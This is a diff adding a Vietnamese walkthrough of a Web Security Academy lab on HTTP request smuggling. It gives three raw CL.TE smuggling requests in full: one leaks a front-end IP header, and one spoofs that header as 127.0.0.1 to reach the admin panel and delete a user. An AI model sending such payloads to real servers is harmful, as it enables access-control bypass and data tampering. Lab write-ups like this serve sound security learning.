@@ -244,6 +244,66 @@ x=
 Kết quả, truy cập trang admin thành công. Để xóa user carlos, ta submit request tương tự đến `/admin/delete?username=carlos`. Như vậy bài lab được giải.
 
 # 8. Exploiting HTTP request smuggling to reveal front-end request rewriting
+Sử dụng Burp Repeater, submit request sau:
+```
+POST / HTTP/1.1
+Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+Transfer-Encoding: chunked
+
+1
+x
+0
+
+G
+```
+Ta thấy xuất hiện lỗi "Not Found", dấu hiệu rằng website có lỗ hổng CL.TE. Thử exploit HRS để gửi request đến `/admin` thì response trả về 401 Unauthorized. Như vậy, ta cần tìm tên header mà server sử dụng để xác định địa chỉ IP nhằm fake localhost.
+
+Trong website có chức năng search, search key được reflected trong response. Như vậy, ta cấu hình request như sau:
+```
+POST / HTTP/1.1
+Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 183
+Transfer-Encoding: chunked
+
+c
+search=triet
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
+Content-Length: 100
+
+search=
+```
+Request trên sẽ exploit HRS, khiến cho search term có giá trị là các header được front-end server thêm vào. Sau khi submit hai lần, ta thấy response trả về có thông tin mong muốn:
+
+![image](https://user-images.githubusercontent.com/103978452/225247897-6494bdd0-3ce9-427a-9c1a-2084dae970ad.png)
+
+Như vậy, server sử dụng header `X-TXovCK-Ip` để xác định địa chỉ IP. Ta cấu hình request bên dưới để vào trang admin:
+```
+POST / HTTP/1.1
+Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 206
+Transfer-Encoding: chunked
+
+c
+search=triet
+0
+
+GET /admin HTTP/1.1
+X-TXovCK-Ip: 127.0.0.1
+Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+x=
+```
+Sau khi submit 2 lần, ta truy cập trang admin thành công. Tiếp đó, để xóa user carlos, ta thực hiện cách tương tự với request `GET /admin/delete?username=carlos`. Kết quả, bài lab được giải.
 
 # 9. Exploiting HTTP request smuggling to capture other users' requests
 
